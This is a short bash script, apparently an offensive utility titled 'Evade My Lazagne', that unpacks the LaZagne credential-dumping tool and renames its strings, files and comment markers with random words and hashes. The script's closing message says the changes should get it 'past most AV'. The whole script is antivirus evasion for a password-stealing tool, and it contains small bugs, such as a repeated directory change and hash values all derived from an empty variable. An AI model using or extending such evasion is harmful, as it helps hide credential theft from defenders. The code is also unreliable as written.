#!/bin/bash
cat << "EOF"
  __ _ ___ ___ _   _ _ __ ___   ___      | |__  _ __ ___  __ _  ___| |__  
 / _` / __/ __| | | | '_ ` _ \ / _ \_____| '_ \| '__/ _ \/ _` |/ __| '_ \ 
| (_| \__ \__ \ |_| | | | | | |  __/_____| |_) | | |  __/ (_| | (__| | | |
 \__,_|___/___/\__,_|_| |_| |_|\___|     |_.__/|_|  \___|\__,_|\___|_| |_|
                           
			    **Evade My Lazagne**
                 
                            Use At Your Own Risk
                  
                   
 
EOF

unzip LaZagne-2.4.3.zip

chmod -R 777 LaZagne-2.4.3

cd LaZagne-2.4.3/Windows/

echo "Enter A Random Word"

read Random1

echo "Enter Another Random Word"

read Random2

echo "Last One"

read Random3

cd LaZagne-2.4.3/Windows/

find -type f -exec sed -i s/lazagne/$Random1/g {} +
find -type f -exec sed -i s/LaZagne/$Random2/g {} +
find -type f -exec sed -i s/laZagne/$Random3/g {} +

mv lazagne/ $Random1
mv LaZagne.py $Random2.py

custom1=$(echo $custom1 | md5sum | head -c 20)
custom2=$(echo $custom1 | md5sum | head -c 20)
custom3=$(echo $custom1 | md5sum | head -c 20)
custom4=$(echo $custom1 | md5sum | head -c 20)
custom5=$(echo $custom1 | md5sum | head -c 20)

find -type f -exec sed -i s/#comment1/#$custom1/g {} +
find -type f -exec sed -i s/#comment2/#$custom2/g {} +
find -type f -exec sed -i s/#comment3/#$custom3/g {} +
find -type f -exec sed -i s/#comment4/#$custom4/g {} +
find -type f -exec sed -i s/#comment5/#$custom5/g {} +

echo "All Done! Your New Tool Should Get Past Most AV!"
sleep 1
echo "Compile Your Tool On A Windows Instance."
